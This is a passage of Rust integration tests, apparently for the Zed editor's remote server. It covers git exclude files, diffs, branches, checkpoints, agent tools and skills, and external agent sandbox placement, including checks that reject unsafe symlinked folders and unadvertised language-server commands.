            .active_repository(cx)
            .expect("remote project should have an active repository")
    });

    for (path, is_dir) in [("tmp.txt", false), ("logs", true), ("tmp.txt", false)] {
        let repo_path = RepoPath::new(path).expect("path should be a valid repo path");
        cx.update(|cx| {
            repository.update(cx, |repository, _| {
                repository.add_path_to_git_info_exclude(&repo_path, is_dir)
            })
        })
        .await
        .expect("add to info/exclude request should complete")
        .expect("add to info/exclude should succeed for remote repository");
    }

    server_cx.run_until_parked();
    cx.run_until_parked();

    assert_eq!(
        fs.load(Path::new("/project/.git/info/exclude"))
            .await
            .expect("info/exclude should be readable"),
        "tmp.txt\nlogs/\n"
    );
}

#[gpui::test]
async fn test_add_path_to_git_info_exclude_in_remote_linked_worktree(
    cx: &mut TestAppContext,
    server_cx: &mut TestAppContext,
) {
    let fs = FakeFs::new(server_cx.executor());
    fs.insert_tree(
        "/project",
        json!({
            ".git": {
                "HEAD": "ref: refs/heads/main",
                "config": "[core]\n\tbare = false\n",
                "info": {
                    "exclude": "existing\n",
                },
                "worktrees": {
                    "linked": {
                        "HEAD": "ref: refs/heads/linked",
                        "commondir": "../..",
                        "gitdir": "/worktree/.git",
                    },
                },
            },
        }),
    )
    .await;
    fs.insert_tree(
        "/worktree",
        json!({
            ".git": "gitdir: ../project/.git/worktrees/linked\n",
            "logs": {
                "app.log": "",
            },
            "tmp.txt": "",
        }),
    )
    .await;
    let repository_dir = Path::new("/project/.git/worktrees/linked");
    fs.set_branch_name(repository_dir, Some("linked"));
    fs.set_head_for_repo(repository_dir, &[], "head-sha");

    let (project, _headless) = init_test(&fs, cx, server_cx).await;
    project
        .update(cx, |project, cx| {
            project.find_or_create_worktree(Path::new("/worktree"), true, cx)
        })
        .await
        .expect("should open remote linked worktree");
    cx.run_until_parked();

    let repository = project.read_with(cx, |project, cx| {
        project
            .active_repository(cx)
            .expect("remote linked worktree should have an active repository")
    });

    for (path, is_dir) in [("tmp.txt", false), ("logs", true), ("tmp.txt", false)] {
        let repo_path = RepoPath::new(path).expect("path should be a valid repo path");
        cx.update(|cx| {
            repository.update(cx, |repository, _| {
                repository.add_path_to_git_info_exclude(&repo_path, is_dir)
            })
        })
        .await
        .expect("add to info/exclude request should complete")
        .expect("add to info/exclude should succeed for remote linked worktree");
    }

    server_cx.run_until_parked();
    cx.run_until_parked();

    assert_eq!(
        fs.load(Path::new("/project/.git/info/exclude"))
            .await
            .expect("shared info/exclude should be readable"),
        "existing\ntmp.txt\nlogs/\n"
    );
    assert!(
        fs.metadata(&repository_dir.join("info/exclude"))
            .await
            .expect("worktree-specific info/exclude metadata should be readable")
            .is_none(),
        "the action should not create a worktree-specific info/exclude"
    );
}

#[gpui::test]
async fn test_remote_git_diffs(cx: &mut TestAppContext, server_cx: &mut TestAppContext) {
    let text_2 = "
        fn one() -> usize {
            1
        }
    "
    .unindent();
    let text_1 = "
        fn one() -> usize {
            0
        }
    "
    .unindent();

    let fs = FakeFs::new(server_cx.executor());
    fs.insert_tree(
        "/code",
        json!({
            "project1": {
                ".git": {},
                "src": {
                    "lib.rs": text_2
                },
                "README.md": "# project 1",
            },
        }),
    )
    .await;
    fs.set_index_for_repo(
        Path::new("/code/project1/.git"),
        &[("src/lib.rs", text_1.clone())],
    );
    fs.set_head_for_repo(
        Path::new("/code/project1/.git"),
        &[("src/lib.rs", text_1.clone())],
        "deadbeef",
    );

    let (project, _headless) = init_test(&fs, cx, server_cx).await;
    let (worktree, _) = project
        .update(cx, |project, cx| {
            project.find_or_create_worktree("/code/project1", true, cx)
        })
        .await
        .unwrap();
    let worktree_id = cx.update(|cx| worktree.read(cx).id());
    cx.executor().run_until_parked();

    let buffer = project
        .update(cx, |project, cx| {
            project.open_buffer((worktree_id, rel_path("src/lib.rs")), cx)
        })
        .await
        .unwrap();
    let diff = project
        .update(cx, |project, cx| {
            project.open_uncommitted_diff(buffer.clone(), cx)
        })
        .await
        .unwrap();

    diff.read_with(cx, |diff, cx| {
        assert_eq!(diff.base_text_string(cx).unwrap(), text_1);
        assert_eq!(
            diff.secondary_diff()
                .unwrap()
                .read(cx)
                .base_text_string(cx)
                .unwrap(),
            text_1
        );
    });

    // stage the current buffer's contents
    fs.set_index_for_repo(
        Path::new("/code/project1/.git"),
        &[("src/lib.rs", text_2.clone())],
    );

    cx.executor().run_until_parked();
    diff.read_with(cx, |diff, cx| {
        assert_eq!(diff.base_text_string(cx).unwrap(), text_1);
        assert_eq!(
            diff.secondary_diff()
                .unwrap()
                .read(cx)
                .base_text_string(cx)
                .unwrap(),
            text_2
        );
    });

    // commit the current buffer's contents
    fs.set_head_for_repo(
        Path::new("/code/project1/.git"),
        &[("src/lib.rs", text_2.clone())],
        "deadbeef",
    );

    cx.executor().run_until_parked();
    diff.read_with(cx, |diff, cx| {
        assert_eq!(diff.base_text_string(cx).unwrap(), text_2);
        assert_eq!(
            diff.secondary_diff()
                .unwrap()
                .read(cx)
                .base_text_string(cx)
                .unwrap(),
            text_2
        );
    });
}

#[gpui::test]
async fn test_remote_git_diffs_when_recv_update_repository_delay(
    cx: &mut TestAppContext,
    server_cx: &mut TestAppContext,
) {
    cx.update(|cx| {
        let settings_store = SettingsStore::test(cx);
        cx.set_global(settings_store);
        theme_settings::init(theme::LoadThemes::JustBase, cx);
        release_channel::init(semver::Version::new(0, 0, 0), cx);
        editor::init(cx);
    });

    use editor::Editor;
    use gpui::VisualContext;
    let text_2 = "
        fn one() -> usize {
            1
        }
    "
    .unindent();
    let text_1 = "
        fn one() -> usize {
            0
        }
    "
    .unindent();

    let fs = FakeFs::new(server_cx.executor());
    fs.insert_tree(
        path!("/code"),
        json!({
            "project1": {
                "src": {
                    "lib.rs": text_2
                },
                "README.md": "# project 1",
            },
        }),
    )
    .await;

    let (project, _headless) = init_test(&fs, cx, server_cx).await;
    let (worktree, _) = project
        .update(cx, |project, cx| {
            project.find_or_create_worktree(path!("/code/project1"), true, cx)
        })
        .await
        .unwrap();
    let worktree_id = cx.update(|cx| worktree.read(cx).id());
    let buffer = project
        .update(cx, |project, cx| {
            project.open_buffer((worktree_id, rel_path("src/lib.rs")), cx)
        })
        .await
        .unwrap();
    let buffer_id = cx.update(|cx| buffer.read(cx).remote_id());

    let cx = cx.add_empty_window();
    let editor = cx.new_window_entity(|window, cx| {
        Editor::for_buffer(buffer, Some(project.clone()), window, cx)
    });

    // Remote server will send proto::UpdateRepository after the instance of Editor create.
    fs.insert_tree(
        path!("/code"),
        json!({
            "project1": {
                ".git": {},
            },
        }),
    )
    .await;

    fs.set_index_for_repo(
        Path::new(path!("/code/project1/.git")),
        &[("src/lib.rs", text_1.clone())],
    );
    fs.set_head_for_repo(
        Path::new(path!("/code/project1/.git")),
        &[("src/lib.rs", text_1.clone())],
        "sha",
    );

    cx.executor().run_until_parked();
    let diff = editor
        .read_with(cx, |editor, cx| {
            editor
                .buffer()
                .read_with(cx, |buffer, _| buffer.diff_for(buffer_id))
        })
        .unwrap();

    diff.read_with(cx, |diff, cx| {
        assert_eq!(diff.base_text_string(cx).unwrap(), text_1);
        assert_eq!(
            diff.secondary_diff()
                .unwrap()
                .read(cx)
                .base_text_string(cx)
                .unwrap(),
            text_1
        );
    });

    // stage the current buffer's contents
    fs.set_index_for_repo(
        Path::new(path!("/code/project1/.git")),
        &[("src/lib.rs", text_2.clone())],
    );

    cx.executor().run_until_parked();
    diff.read_with(cx, |diff, cx| {
        assert_eq!(diff.base_text_string(cx).unwrap(), text_1);
        assert_eq!(
            diff.secondary_diff()
                .unwrap()
                .read(cx)
                .base_text_string(cx)
                .unwrap(),
            text_2
        );
    });

    // commit the current buffer's contents
    fs.set_head_for_repo(
        Path::new(path!("/code/project1/.git")),
        &[("src/lib.rs", text_2.clone())],
        "sha",
    );

    cx.executor().run_until_parked();
    diff.read_with(cx, |diff, cx| {
        assert_eq!(diff.base_text_string(cx).unwrap(), text_2);
        assert_eq!(
            diff.secondary_diff()
                .unwrap()
                .read(cx)
                .base_text_string(cx)
                .unwrap(),
            text_2
        );
    });
}

#[gpui::test]
async fn test_remote_git_branches(cx: &mut TestAppContext, server_cx: &mut TestAppContext) {
    let fs = FakeFs::new(server_cx.executor());
    fs.insert_tree(
        path!("/code"),
        json!({
            "project1": {
                ".git": {},
                "README.md": "# project 1",
            },
        }),
    )
    .await;

    let (project, headless_project) = init_test(&fs, cx, server_cx).await;
    let branches = ["main", "dev", "feature-1"];
    let branches_set = branches
        .iter()
        .map(ToString::to_string)
        .collect::<HashSet<_>>();
    fs.insert_branches(Path::new(path!("/code/project1/.git")), &branches);

    let (_worktree, _) = project
        .update(cx, |project, cx| {
            project.find_or_create_worktree(path!("/code/project1"), true, cx)
        })
        .await
        .unwrap();
    // Give the worktree a bit of time to index the file system
    cx.run_until_parked();

    let repository = project.update(cx, |project, cx| project.active_repository(cx).unwrap());

    let remote_branches = repository
        .update(cx, |repository, _| repository.branches())
        .await
        .unwrap()
        .unwrap()
        .branches;

    let new_branch = branches[2];

    let remote_branches = remote_branches
        .into_iter()
        .map(|branch| branch.name().to_string())
        .collect::<HashSet<_>>();

    assert_eq!(&remote_branches, &branches_set);

    cx.update(|cx| {
        repository.update(cx, |repository, _cx| {
            repository.change_branch(new_branch.to_string())
        })
    })
    .await
    .unwrap()
    .unwrap();

    cx.run_until_parked();

    let server_branch = server_cx.update(|cx| {
        headless_project.update(cx, |headless_project, cx| {
            headless_project.git_store.update(cx, |git_store, cx| {
                git_store
                    .repositories()
                    .values()
                    .next()
                    .unwrap()
                    .read(cx)
                    .branch
                    .as_ref()
                    .unwrap()
                    .clone()
            })
        })
    });

    assert_eq!(server_branch.name(), branches[2]);

    // Also try creating a new branch
    cx.update(|cx| {
        repository.update(cx, |repo, _cx| {
            repo.create_branch("totally-new-branch".to_string(), None)
        })
    })
    .await
    .unwrap()
    .unwrap();

    cx.update(|cx| {
        repository.update(cx, |repo, _cx| {
            repo.change_branch("totally-new-branch".to_string())
        })
    })
    .await
    .unwrap()
    .unwrap();

    cx.run_until_parked();

    let server_branch = server_cx.update(|cx| {
        headless_project.update(cx, |headless_project, cx| {
            headless_project.git_store.update(cx, |git_store, cx| {
                git_store
                    .repositories()
                    .values()
                    .next()
                    .unwrap()
                    .read(cx)
                    .branch
                    .as_ref()
                    .unwrap()
                    .clone()
            })
        })
    });

    assert_eq!(server_branch.name(), "totally-new-branch");

    let default_branch = cx
        .update(|cx| repository.update(cx, |repository, _cx| repository.default_branch(false)))
        .await
        .unwrap()
        .unwrap();
    assert_eq!(default_branch.as_deref(), Some("main"));

    let default_branch_with_remote = cx
        .update(|cx| repository.update(cx, |repository, _cx| repository.default_branch(true)))
        .await
        .unwrap()
        .unwrap();
    assert_eq!(default_branch_with_remote.as_deref(), Some("origin/main"));
}

#[gpui::test]
async fn test_remote_git_status_error_reaches_client(
    cx: &mut TestAppContext,
    server_cx: &mut TestAppContext,
) {
    let fs = FakeFs::new(server_cx.executor());
    fs.insert_tree(
        path!("/code"),
        json!({
            "project1": {
                ".git": {},
                "README.md": "# project 1",
            },
        }),
    )
    .await;
    let dot_git = Path::new(path!("/code/project1/.git"));
    let status_error =
        "git status failed: error: unknown option `no-renames'\nusage: git status [<options>]";
    fs.set_status_error(dot_git, Some(status_error.to_owned()));

    let (project, _headless_project) = init_test(&fs, cx, server_cx).await;
    project
        .update(cx, |project, cx| {
            project.find_or_create_worktree(path!("/code/project1"), true, cx)
        })
        .await
        .unwrap();
    cx.run_until_parked();

    let repository = project.update(cx, |project, cx| project.active_repository(cx).unwrap());
    repository.read_with(cx, |repository, _| {
        assert_eq!(repository.status_error.as_deref(), Some(status_error));
        assert!(repository.statuses_by_path.is_empty());
    });

    fs.set_status_error(dot_git, None);
    cx.run_until_parked();

    repository.read_with(cx, |repository, _| {
        assert_eq!(repository.status_error, None);
        assert!(!repository.statuses_by_path.is_empty());
    });
}

#[gpui::test]
async fn test_remote_git_open_error_reaches_client(
    cx: &mut TestAppContext,
    server_cx: &mut TestAppContext,
) {
    let fs = FakeFs::new(server_cx.executor());
    fs.insert_tree(
        path!("/code"),
        json!({
            "project1": {
                ".git": {},
                "README.md": "# project 1",
            },
        }),
    )
    .await;
    fs.with_git_state(Path::new(path!("/code/project1/.git")), false, |state| {
        state.simulated_open_error = Some("no git binary available".to_owned());
    })
    .unwrap();

    let (project, _headless_project) = init_test(&fs, cx, server_cx).await;
    project
        .update(cx, |project, cx| {
            project.find_or_create_worktree(path!("/code/project1"), true, cx)
        })
        .await
        .unwrap();
    cx.run_until_parked();

    let repository = project.update(cx, |project, cx| project.active_repository(cx).unwrap());
    let status_error = repository
        .read_with(cx, |repository, _| repository.status_error.clone())
        .expect("the server's open failure should reach the client");
    assert!(
        status_error.contains("no git binary available"),
        "unexpected error: {status_error}"
    );
}

#[gpui::test]
async fn test_remote_git_checkpoints(cx: &mut TestAppContext, server_cx: &mut TestAppContext) {
    let fs = FakeFs::new(server_cx.executor());
    fs.insert_tree(
        path!("/code"),
        json!({
            "project1": {
                ".git": {},
                "file.txt": "original content",
            },
        }),
    )
    .await;

    let (project, _headless) = init_test(&fs, cx, server_cx).await;

    let (_worktree, _) = project
        .update(cx, |project, cx| {
            project.find_or_create_worktree(path!("/code/project1"), true, cx)
        })
        .await
        .unwrap();
    cx.run_until_parked();

    let repository = project.update(cx, |project, cx| project.active_repository(cx).unwrap());

    // 1. Create a checkpoint of the original state
    let checkpoint_1 = repository
        .update(cx, |repository, _| repository.checkpoint())
        .await
        .unwrap()
        .unwrap();

    // 2. Modify a file on the server-side fs
    fs.write(
        Path::new(path!("/code/project1/file.txt")),
        b"modified content",
    )
    .await
    .unwrap();

    // 3. Create a second checkpoint with the modified state
    let checkpoint_2 = repository
        .update(cx, |repository, _| repository.checkpoint())
        .await
        .unwrap()
        .unwrap();

    // 4. compare_checkpoints: same checkpoint with itself => equal
    let equal = repository
        .update(cx, |repository, _| {
            repository.compare_checkpoints(checkpoint_1.clone(), checkpoint_1.clone())
        })
        .await
        .unwrap()
        .unwrap();
    assert!(equal, "a checkpoint compared with itself should be equal");

    // 5. compare_checkpoints: different states => not equal
    let equal = repository
        .update(cx, |repository, _| {
            repository.compare_checkpoints(checkpoint_1.clone(), checkpoint_2.clone())
        })
        .await
        .unwrap()
        .unwrap();
    assert!(
        !equal,
        "checkpoints of different states should not be equal"
    );

    // 6. diff_checkpoints: same checkpoint => empty diff
    let diff = repository
        .update(cx, |repository, _| {
            repository.diff_checkpoints(checkpoint_1.clone(), checkpoint_1.clone())
        })
        .await
        .unwrap()
        .unwrap();
    assert!(
        diff.is_empty(),
        "diff of identical checkpoints should be empty"
    );

    // 7. diff_checkpoints: different checkpoints => non-empty diff mentioning the changed file
    let diff = repository
        .update(cx, |repository, _| {
            repository.diff_checkpoints(checkpoint_1.clone(), checkpoint_2.clone())
        })
        .await
        .unwrap()
        .unwrap();
    assert!(
        !diff.is_empty(),
        "diff of different checkpoints should be non-empty"
    );
    assert!(
        diff.contains("file.txt"),
        "diff should mention the changed file"
    );
    assert!(
        diff.contains("original content"),
        "diff should contain removed content"
    );
    assert!(
        diff.contains("modified content"),
        "diff should contain added content"
    );

    // 8. restore_checkpoint: restore to original state
    repository
        .update(cx, |repository, _| {
            repository.restore_checkpoint(checkpoint_1.clone())
        })
        .await
        .unwrap()
        .unwrap();
    cx.run_until_parked();

    // 9. Create a checkpoint after restore
    let checkpoint_3 = repository
        .update(cx, |repository, _| repository.checkpoint())
        .await
        .unwrap()
        .unwrap();

    // 10. compare_checkpoints: restored state matches original
    let equal = repository
        .update(cx, |repository, _| {
            repository.compare_checkpoints(checkpoint_1.clone(), checkpoint_3.clone())
        })
        .await
        .unwrap()
        .unwrap();
    assert!(equal, "restored state should match original checkpoint");

    // 11. diff_checkpoints: restored state vs original => empty diff
    let diff = repository
        .update(cx, |repository, _| {
            repository.diff_checkpoints(checkpoint_1.clone(), checkpoint_3.clone())
        })
        .await
        .unwrap()
        .unwrap();
    assert!(diff.is_empty(), "diff after restore should be empty");
}

#[gpui::test]
async fn test_remote_agent_fs_tool_calls(cx: &mut TestAppContext, server_cx: &mut TestAppContext) {
    let fs = FakeFs::new(server_cx.executor());
    fs.insert_tree(
        path!("/project"),
        json!({
            "a.txt": "A",
            "b.txt": "B",
        }),
    )
    .await;

    let (project, _headless_project) = init_test(&fs, cx, server_cx).await;
    project
        .update(cx, |project, cx| {
            project.find_or_create_worktree(path!("/project"), true, cx)
        })
        .await
        .unwrap();

    let action_log = cx.new(|_| action_log::ActionLog::new(project.clone()));

    let input = ReadFileToolInput {
        path: "project/b.txt".into(),
        start_line: None,
        end_line: None,
    };
    let read_tool = Arc::new(ReadFileTool::new(project, action_log, true));
    let (event_stream, _) = ToolCallEventStream::test();

    let exists_result = cx.update(|cx| {
        read_tool
            .clone()
            .run(ToolInput::resolved(input), event_stream.clone(), cx)
    });
    let output = exists_result.await.unwrap();
    assert_eq!(
        output,
        LanguageModelToolResultContent::Text("     1\tB".into())
    );

    let input = ReadFileToolInput {
        path: "project/c.txt".into(),
        start_line: None,
        end_line: None,
    };
    let does_not_exist_result =
        cx.update(|cx| read_tool.run(ToolInput::resolved(input), event_stream, cx));
    does_not_exist_result.await.unwrap_err();
}

#[gpui::test]
async fn test_adding_remote_skill(cx: &mut TestAppContext, server_cx: &mut TestAppContext) {
    use acp_thread::AgentConnection as _;

    let fs = FakeFs::new(server_cx.executor());
    fs.insert_tree(
        path!("/project"),
        json!({
            ".agents": {
                "skills": {
                    "test-skill": {
                        "SKILL.md": "---\nname: test-skill\ndescription: test description\n---\ntest body"
                    }
                }
            }
        }),
    )
    .await;

    let (project, _headless_project) = init_test(&fs, cx, server_cx).await;
    cx.update(|cx| {
        LanguageModelRegistry::test(cx);
    });
    let (_worktree, _rel_path) = project
        .update(cx, |project, cx| {
            project.find_or_create_worktree(path!("/project"), true, cx)
        })
        .await
        .unwrap();
    cx.run_until_parked();
    let thread_store = cx.new(|cx| ThreadStore::new(cx));
    let agent = cx.update(|cx| NativeAgent::new(thread_store, Templates::new(), fs.clone(), cx));
    let connection = Rc::new(NativeAgentConnection(agent.clone()));
    let _acp_thread = cx
        .update(|cx| {
            connection.clone().new_session(
                project.clone(),
                PathList::new(&[Path::new("/project")]),
                cx,
            )
        })
        .await
        .unwrap();
    cx.run_until_parked();

    let skill_tool = Arc::new(SkillTool::with_body_resolver(
        skills_resolver_for_project(agent.downgrade(), project.entity_id()),
        skill_body_resolver_for_project(project.clone(), fs.clone()),
    ));
    let (event_stream, mut event_stream_rx) = ToolCallEventStream::test();

    let input = SkillToolInput {
        name: "test-skill".into(),
    };
    let task = cx.update(|cx| {
        skill_tool
            .clone()
            .run(ToolInput::resolved(input), event_stream.clone(), cx)
    });

    // The project-local skill is not a built-in, so the tool requests
    // authorization. Approve it so the tool can proceed.
    let authorization = event_stream_rx.expect_authorization().await;
    authorization
        .response
        .send(acp_thread::SelectedPermissionOutcome::new(
            agent_client_protocol::schema::v1::PermissionOptionId::new("allow"),
            agent_client_protocol::schema::v1::PermissionOptionKind::AllowOnce,
        ))
        .unwrap();

    let output = task.await.unwrap();
    cx.run_until_parked();
    let expected = format!(
        concat!(
            "<skill_content name=\"test-skill\">\n",
            "<source>project-local</source>\n",
            "<worktree>project</worktree>\n",
            "<directory>{}</directory>\n",
            "Relative paths in this skill resolve against <directory>.\n",
            "\n",
            "test body\n",
            "</skill_content>\n",
        ),
        path!("/project/.agents/skills/test-skill"),
    );
    assert_eq!(output, SkillToolOutput::Found { rendered: expected });

    fs.create_dir(Path::new(path!("/project/.agents/skills/test-2")))
        .await
        .unwrap();
    fs.insert_file(
        path!("/project/.agents/skills/test-2/SKILL.md"),
        "---\nname: test-2\ndescription: test description\n---\ntest body"
            .as_bytes()
            .into(),
    )
    .await;

    cx.run_until_parked();
    cx.update(|cx| connection.refresh_skills_for_project(project, cx));
    cx.run_until_parked();

    let input2 = SkillToolInput {
        name: "test-2".into(),
    };
    let task = cx.update(|cx| {
        skill_tool
            .clone()
            .run(ToolInput::resolved(input2), event_stream.clone(), cx)
    });

    let authorization = event_stream_rx.expect_authorization().await;
    authorization
        .response
        .send(acp_thread::SelectedPermissionOutcome::new(
            agent_client_protocol::schema::v1::PermissionOptionId::new("allow"),
            agent_client_protocol::schema::v1::PermissionOptionKind::AllowOnce,
        ))
        .unwrap();

    let output = task.await.unwrap();
    let expected2 = format!(
        concat!(
            "<skill_content name=\"test-2\">\n",
            "<source>project-local</source>\n",
            "<worktree>project</worktree>\n",
            "<directory>{}</directory>\n",
            "Relative paths in this skill resolve against <directory>.\n",
            "\n",
            "test body\n",
            "</skill_content>\n",
        ),
        path!("/project/.agents/skills/test-2"),
    );
    assert_eq!(
        output,
        SkillToolOutput::Found {
            rendered: expected2
        }
    );
}

#[gpui::test]
async fn test_remote_external_agent_server(
    cx: &mut TestAppContext,
    server_cx: &mut TestAppContext,
) {
    let fs = FakeFs::new(server_cx.executor());
    fs.insert_tree(path!("/project"), json!({})).await;

    let (project, _headless_project) = init_test(&fs, cx, server_cx).await;
    project
        .update(cx, |project, cx| {
            project.find_or_create_worktree(path!("/project"), true, cx)
        })
        .await
        .unwrap();
    let names = project.update(cx, |project, cx| {
        project
            .agent_server_store()
            .read(cx)
            .external_agents()
            .map(|name| name.to_string())
            .collect::<Vec<_>>()
    });
    pretty_assertions::assert_eq!(names, Vec::<String>::new());
    server_cx.update_global::<SettingsStore, _>(|settings_store, cx| {
        settings_store
            .set_server_settings(
                &json!({
                    "agent_servers": {
                        "foo": {
                            "type": "custom",
                            "command": "foo-cli",
                            "args": ["--flag"],
                            "env": {
                                "VAR": "val"
                            }
                        }
                    }
                })
                .to_string(),
                cx,
            )
            .unwrap();
    });
    server_cx.run_until_parked();
    cx.run_until_parked();
    let names = project.update(cx, |project, cx| {
        project
            .agent_server_store()
            .read(cx)
            .external_agents()
            .map(|name| name.to_string())
            .collect::<Vec<_>>()
    });
    pretty_assertions::assert_eq!(names, ["foo"]);
    let command = project
        .update(cx, |project, cx| {
            project.agent_server_store().update(cx, |store, cx| {
                store
                    .get_external_agent(&"foo".into())
                    .unwrap()
                    .get_command(
                        vec![],
                        HashMap::from_iter([("OTHER_VAR".into(), "other-val".into())]),
                        project::AgentLaunchTarget::Sandbox { wsl_distro: None },
                        &mut cx.to_async(),
                    )
            })
        })
        .await
        .unwrap();
    assert_eq!(
        command,
        AgentServerCommand {
            path: "foo-cli".into(),
            args: vec!["--flag".into()],
            env: Some(HashMap::from_iter([
                ("NO_BROWSER".into(), "1".into()),
                ("VAR".into(), "val".into()),
                ("OTHER_VAR".into(), "other-val".into())
            ])),
            // The host's file system is a fake one here, so nothing is placed
            // on it for the sandbox.
            sandbox: None,
        }
    );
}

/// ADR-F49 第 2a 段: on a real file system the host makes the agent's
/// per-project configuration folder and describes it to the client, which
/// takes it only as far as its own policy for the agent goes. A folder the
/// host cannot make safely comes back as the reason, so that the client can
/// refuse the start and offer one outside the sandbox (decision 19).
#[cfg(unix)]
#[gpui::test]
async fn test_remote_external_agent_sandbox_is_placed_on_the_host(
    cx: &mut TestAppContext,
    server_cx: &mut TestAppContext,
) {
    use project::agent_sandbox::{AgentSandboxHosts, AgentSandboxState};

    let home = tempfile::tempdir().expect("a home for the test");
    let project_dir = tempfile::tempdir().expect("a project for the test");
    std::fs::write(project_dir.path().join("main.rs"), "fn main() {}\n").expect("a file");
    project::agent_sandbox::set_sandboxed_agents_home_for_test(Some(home.path().to_path_buf()));
    let _restore_home = util::defer(|| {
        project::agent_sandbox::set_sandboxed_agents_home_for_test(None);
    });

    let server_fs: Arc<dyn Fs> = fs::RealFs::new(None, server_cx.executor());
    let (project, _headless_project) = init_test_with_fs(server_fs, cx, server_cx).await;
    project
        .update(cx, |project, cx| {
            project.find_or_create_worktree(project_dir.path(), true, cx)
        })
        .await
        .unwrap();
    server_cx.update_global::<SettingsStore, _>(|settings_store, cx| {
        settings_store
            .set_server_settings(
                &json!({
                    "agent_servers": {
                        "foo": { "type": "custom", "command": "foo-cli" }
                    }
                })
                .to_string(),
                cx,
            )
            .unwrap();
    });
    server_cx.run_until_parked();
    cx.run_until_parked();

    let get_command = |cx: &mut TestAppContext| {
        project.update(cx, |project, cx| {
            project.agent_server_store().update(cx, |store, cx| {
                store
                    .get_external_agent(&"foo".into())
                    .unwrap()
                    .get_command(
                        vec![],
                        HashMap::default(),
                        project::AgentLaunchTarget::Sandbox { wsl_distro: None },
                        &mut cx.to_async(),
                    )
            })
        })
    };

    let command = get_command(cx).await.unwrap();
    let sandbox = command.sandbox.expect("the host placed the agent");
    let AgentSandboxState::Resolved { config_dir, hosts } = &sandbox.state else {
        panic!("expected the agent to be placed, got {:?}", sandbox.state);
    };
    assert!(
        config_dir.starts_with(
            home.path()
                .join(sandbox::SANDBOXED_AGENT_PROJECTS_HOME_RELATIVE)
        ),
        "{config_dir:?}"
    );
    assert_eq!(
        config_dir.file_name().and_then(|name| name.to_str()),
        Some("agent-foo"),
        "a custom agent gets its own folder"
    );
    assert!(config_dir.join("home").is_dir(), "its home is made for it");
    assert_eq!(
        sandbox.env.get("HOME").map(String::as_str),
        Some(config_dir.join("home").to_string_lossy().as_ref()),
        "the environment that confines it points into the folder"
    );
    assert_eq!(
        hosts,
        &AgentSandboxHosts::EditorAllowlist,
        "an agent with no profile of its own is capped by the IDE-wide allowlist"
    );

    // A level the host cannot open safely: the whole placement fails and the
    // client is told why.
    let projects = home
        .path()
        .join(sandbox::SANDBOXED_AGENT_PROJECTS_HOME_RELATIVE);
    std::fs::remove_dir_all(&projects).expect("the projects directory");
    std::os::unix::fs::symlink(project_dir.path(), &projects).expect("a link in its place");

    let command = get_command(cx).await.unwrap();
    let sandbox = command.sandbox.expect("the host reported why it could not");
    assert!(
        matches!(sandbox.state, AgentSandboxState::Unavailable { .. }),
        "expected a reason, got {:?}",
        sandbox.state
    );
}

#[gpui::test]
async fn test_remote_apply_code_action_skips_unadvertised_command(
    cx: &mut TestAppContext,
    server_cx: &mut TestAppContext,
) {
    cx.update(ProjectLaunchApprovals::approve_everything_for_tests);
    let fs = FakeFs::new(server_cx.executor());
    fs.insert_tree(
        path!("/code"),
        json!({
            "project1": {
                ".git": {},
                "README.md": "# project 1",
                "src": {
                    "lib.rs": "fn one() -> usize { 1 }"
                }
            },
        }),
    )
    .await;

    let (project, headless) = init_test(&fs, cx, server_cx).await;

    fs.insert_tree(
        path!("/code/project1/.zed"),
        json!({
            "settings.json": r#"
          {
            "languages": {"Rust":{"language_servers":["rust-analyzer"]}},
            "lsp": {
              "rust-analyzer": {
                "binary": {
                  "path": "~/.cargo/bin/rust-analyzer"
                }
              }
            }
          }"#
        }),
    )
    .await;

    cx.update_entity(&project, |project, _| {
        project.languages().register_test_language(LanguageConfig {
            name: "Rust".into(),
            matcher: (LanguageMatcher {
                path_suffixes: vec!["rs".into()],
                ..Default::default()
            })
            .into(),
            ..Default::default()
        });
        project.languages().register_fake_lsp_adapter(
            "Rust",
            FakeLspAdapter {
                name: "rust-analyzer",
                ..Default::default()
            },
        )
    });

    // Register the fake LSP with an empty execute_command_provider and a handler that panics
    // if it is ever reached: commands not advertised by the server must be rejected by
    // `apply_code_action` before dispatching to the language server.
    let mut fake_lsp = server_cx.update(|cx| {
        headless.read(cx).languages.register_fake_lsp_server(
            LanguageServerName("rust-analyzer".into()),
            lsp::ServerCapabilities {
                execute_command_provider: Some(lsp::ExecuteCommandOptions {
                    commands: Vec::new(),
                    ..Default::default()
                }),
                ..Default::default()
            },
            Some(Box::new(|fake| {
                fake.set_request_handler::<lsp::request::ExecuteCommand, _, _>(
                    |params, _| async move {
                        panic!(
                            "Unadvertised command {} must not reach the language server",
                            params.command
                        );
                    },
                );
            })),
        )
    });

    cx.run_until_parked();

    let worktree_id = project
        .update(cx, |project, cx| {
            project.find_or_create_worktree(path!("/code/project1"), true, cx)
        })
        .await
        .unwrap()
        .0
        .read_with(cx, |worktree, _| worktree.id());

    cx.run_until_parked();

    let (buffer, _handle) = project
        .update(cx, |project, cx| {
            project.open_buffer_with_lsp((worktree_id, rel_path("src/lib.rs")), cx)
        })
        .await
        .unwrap();

    cx.run_until_parked();

    let _fake_lsp = fake_lsp.next().await.unwrap();

    let server_id = server_cx.read(|cx| {
        *headless
            .read(cx)
            .lsp_store
            .read(cx)
            .as_local()
            .unwrap()
            .language_servers
            .keys()
            .next()
            .unwrap()
    });
    let buffer_id = cx.read(|cx| buffer.read(cx).remote_id());

    let action = project::CodeAction {
        server_id,
        range: language::Anchor::min_min_range_for_buffer(buffer_id),
        lsp_action: project::LspAction::Command(lsp::Command {
            title: "\u{25b6}\u{fe0e} Run Tests".into(),
            command: "rust-analyzer.runSingle".into(),
            arguments: Some(vec![json!({"label": "test-mod tests"})]),
        }),
        resolved: true,
    };

    let transaction = project
        .update(cx, |project, cx| {
            project.apply_code_action(buffer.clone(), action, true, cx)
        })
        .await
        .expect("Unadvertised command must not be forwarded to executeCommand");
    assert_eq!(transaction.0.len(), 0);
}

#[gpui::test]
async fn test_remote_lsp_show_document(cx: &mut TestAppContext, server_cx: &mut TestAppContext) {
    let fs = FakeFs::new(server_cx.executor());
    fs.insert_tree(
        path!("/code"),
        json!({
            "project1": {
                ".git": {},
                "src": {
                    "lib.rs": "fn one() -> usize { 1 }",
                    "other.rs": "fn two() -> usize { 2 }"
                }
            },
        }),
    )
    .await;

    let (project, headless) = init_test(&fs, cx, server_cx).await;

    cx.update_entity(&project, |project, _| {
        project.languages().register_test_language(LanguageConfig {
            name: "Rust".into(),
            matcher: (LanguageMatcher {
                path_suffixes: vec!["rs".into()],
                ..LanguageMatcher::default()
            })
            .into(),
            ..LanguageConfig::default()
        });
        project.languages().register_fake_lsp_adapter(
            "Rust",
